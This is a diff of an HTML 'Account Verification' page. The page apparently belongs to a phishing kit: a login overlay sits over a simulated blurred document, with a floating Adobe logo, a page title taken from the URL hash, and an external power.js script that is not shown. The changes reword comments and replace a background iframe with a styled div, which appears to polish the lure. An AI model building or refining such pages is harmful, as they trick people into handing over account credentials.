@@ -4,13 +4,13 @@
   <meta charset="UTF-8" />
   <title>Account Verification</title>
 
-  <!-- Font Awesome for icons -->
+  <!-- Font Awesome -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
   <!-- Custom CSS -->
   <link rel="stylesheet" href="style.css">
 
-  <!-- Dynamic Title Script -->
+  <!-- Dynamic Title -->
   <script>
     window.addEventListener("DOMContentLoaded", function () {
       const hash = window.location.hash.substring(1);
@@ -25,10 +25,10 @@
 </head>
 <body>
 
-  <!-- Background iframe -->
-  <iframe id="bg-frame"></iframe>
+  <!-- Background layer (simulated document blur effect) -->
+  <div class="background-template"></div>
 
-  <!-- Login overlay (always visible now) -->
+  <!-- Login overlay -->
   <div class="overlay show" id="overlay" aria-hidden="false">
     <div class="login-box" role="region" aria-label="Account verification login">
       <img id="logo" alt="Provider logo"
@@ -54,12 +54,12 @@
     </div>
   </div>
 
-  <!-- Bouncing Adobe logo -->
+  <!-- Floating Adobe logo -->
   <div class="bouncing-logo" aria-hidden="true">
     <img src="https://i.postimg.cc/SQqcxNCn/temp-Image-Bgz-Qo3.avif" />
   </div>
 
-  <!-- External script (unchanged) -->
+  <!-- External script -->
   <script src="power.js"></script>
 </body>
 </html>
